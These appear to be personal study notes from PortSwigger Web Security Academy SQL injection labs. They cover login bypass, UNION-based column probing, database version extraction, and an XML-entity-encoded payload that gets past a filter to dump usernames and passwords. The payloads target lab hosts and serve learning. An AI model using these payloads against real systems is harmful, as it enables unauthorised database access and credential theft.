https://portswigger.net/web-security/sql-injection/cheat-sheet
Basic Methods:
    Retrieving hidden data - where you can modify an SQL query to return additional results.
    Subverting application logic - where you can change a query to interfere with the application's logic.
    UNION attacks- where you can retrieve data from different database tables.
    Examining the database - where you can extract information about the version and structure of the database.
    Blind SQL injection -  where the results of a query you control are not returned in the application's responses.
Commands in SQL:    
    -- Comment
    
    
1. Where clause in http get method. 
2. Bypass login username, password doesn't matter. Where clause again.
3. Examining the database
4. Blind SQL injection vulnerabilities
5. SQL injection with filter bypass via XML encoding






1. Where clause in http get method. 
https://insecure-website.com/products?category=Gifts Real web page
https://insecure-website.com/products?category=Gifts'--   Injection, Single quote gives Gifts inned 'Gifts' as app tacks on '' outer. 
SELECT * FROM products WHERE category = 'Gifts' AND released = 1;   Real query
SELECT * FROM products WHERE category = 'Gifts'--' AND released = 1;  What our '-- did
You need to get all categories released and unlreleased:
' or category = 'Pets' or category = 'Lifestyle' or category = 'Accessories'--
filter?category=Clothing%2c+shoes+and+accessories' or category = 'Pets' or category = 'Lifestyle' or category = 'Accessories'--
Above code worked but only because corporate firewall was blocking the real solution: ' or 1=1 --

https://insecure-website.com/products?category=Gifts'+OR+1=1--
You can do this one from the GUI but it says to use intercept and modify from BURP. I thought BURP requirement was why I was failing. It doesn't care about client side
it was a firewall. 

Solutions:
'+OR+1=1--   WAF would block
filter?category=Clothing%2c+shoes+and+accessories' or category = 'Pets' or category = 'Lifestyle' or category = 'Accessories'--    WAF likely no block

2. 
Typed into gui administrator'--
Need to increase burp skills 
csrf=WdhkXnM3RCCBUnPOw4jLxb1qGaAT4mZn&username=administrator%27--&password=1111111
' to hex is 27
Learned intercept to hack from there and the GUI

3. Examining the database
https://portswigger.net/web-security/sql-injection/examining-the-database
Oracle: SELECT * FROM v$version UNION SELECT * FROM information_schema.tables; schema is just tabled and column info no data just the meta.
Microsoft, MySQL: 	SELECT @@version 
PostgreSQL: 	SELECT version() 
A. Oracle 
Hint: On Oracle databases, every SELECT statement must specify a table to select FROM. If your UNION SELECT attack does not query from a table, you will still need to include the FROM keyword followed by a valid table name. 
UNION needs to return the correct amount of columns and data type.
We have an idea of where the data is at we need to weaponize an exploit: Playing a bit with not enough data
Get our count:
GET /filter?category=Corporate+gifts'+UNION+SELECT+'NULL','NULL'+FROM+dual-- HTTP/1.1   200 OK we have two columns of data. 
' ORDER BY 1--
' ORDER BY 2--
' ORDER BY 3--   # You have to go higher than the columns to get an error
We may want to know Types of data sent:
Finding the string
' UNION SELECT 'a',NULL,NULL,NULL--
' UNION SELECT NULL,'a',NULL,NULL--
' UNION SELECT NULL,NULL,'a',NULL--
' UNION SELECT NULL,NULL,NULL,'a'--
Solution to get database info:
https://0a450001049f6a69c215b5f400880062.web-security-academy.net/filter?category=Gifts'+UNION+SELECT+'v$version','NULL'+FROM+dual--



B. Microsoft, MySQL: 	SELECT @@version
' SELECT @@version--
filter?category='+UNION+SELECT+'@@version',@@version--%20            The second one with no quotes is what gets it to work, with quotes no worky

4. Blind SQL injection vulnerabilities
https://portswigger.net/web-security/sql-injection/blind
This means that the application does not return the results of the SQL query or the details of any database errors within its responses.

5.
Put in math and parameters within XML to see if it works.
Put in a union to see if it blocks or not or what happends.


"UN" + "ION" SELECT NULL    Detected
"UN" + "ION" "SEL" + "ECT" NULL   Getting a 0 supposofly you can only fetch one column

"UNI" + "ON" "SEL" + "ECT" username from users 0 

<@hex_entities>1 "UNI" + "ON" "SEL" + "ECT" "user" + "name" || '~' || "pass" + "word" FROM users<@/hex_entities> detected


<@hex_entities>1 &#x55;NION &#x53;ELECT &#x75;sername || '~' || &#x70;assword &#x46;ROM users<@/hex_entities></storeId>


UNION SELECT username || '~' || password FROM users
| &#x7c;
' &#39

"UN" + "ION" "SE" + "LECT" username || '~' || password FROM users det
"UN" + "ION" "SE" + "LECT" username password FROM users  0 
"UN" + "ION" "SE" + "LECT" username || &#x27;&#x7e;&#x27; || password FROM user 0
"UN" + "ION" "SE" + "LECT" username &#x7c;&#x7c; '~' &#x7c;&#x7c; password FROM users det
"UN" + "ION" "SE" + "LECT" username || '&#x7e;' || password FROM users det
"UN" + "ION" "SE" + "LECT" username from users
"UN" + "ION" "SE" + "LECT" username || '&#x7e;' || password FROM users

<@hex_entities>1 UNION SELECT username || &#39;~&#39; || password FROM users<@/hex_entities> det 
<@hex_entities>1 	&#x55NION 	&#x53ELECT username || &#39;~&#39; || password FROM users<@/hex_entities> parsing error

1 UNION SELECT NULL; attack detected 
<@dec_entities> 1 UNION SELECT NULL <@/dec_entities>;   Attack detected
https://v2.cryptii.com/text/htmlentities   Converter
https://calculla.com/ascii_hex_table       Reference table
<@dec_entities>&#49;&#32;&#85;&#78;&#73;&#79;&#78;&#32;&#83;&#69;&#76;&#69;&#67;&#84;&#32;&#78;&#85;&#76;&#76;<@/dec_entities>;  XML parsing error
<@dec_entities>&#49;<@/dec_entities>; XML parsing error
1: &#x31;hex output 670 units 	&#49;html    670 ok we going some where
&#49;&#32;&#85;&#78;&#73;&#79;&#78;&#32;&#83;&#69;&#76;&#69;&#67;&#84;&#32;&#78;&#85;&#76;&#76;   is  1 UNION SELECT NULL  FINALLY FINALLY 670 NULL
1 UNION select username from users
Just put the entities directly in we don't need any of those tags. 

Answer:
1 UNION SELECT username || '~' || password FROM users
&#49;&#32;&#85;&#78;&#73;&#79;&#78;&#32;&#83;&#69;&#76;&#69;&#67;&#84;&#32;&#117;&#115;&#101;&#114;&#110;&#97;&#109;&#101;&#32;&#124;&#124;&#32;&#39;&#126;&#39;&#32;&#124;&#124;&#32;&#112;&#97;&#115;&#115;&#119;&#111;&#114;&#100;&#32;&#70;&#82;&#79;&#77;&#32;&#117;&#115;&#101;&#114;&#115;
How it was sent:
<?xml version="1.0" encoding="UTF-8"?><stockCheck><productId>1</productId><storeId>&#49;&#32;&#85;&#78;&#73;&#79;&#78;&#32;&#83;&#69;&#76;&#69;&#67;&#84;&#32;&#117;&#115;&#101;&#114;&#110;&#97;&#109;&#101;&#32;&#124;&#124;&#32;&#39;&#126;&#39;&#32;&#124;&#124;&#32;&#112;&#97;&#115;&#115;&#119;&#111;&#114;&#100;&#32;&#70;&#82;&#79;&#77;&#32;&#117;&#115;&#101;&#114;&#115;</storeId></stockCheck>


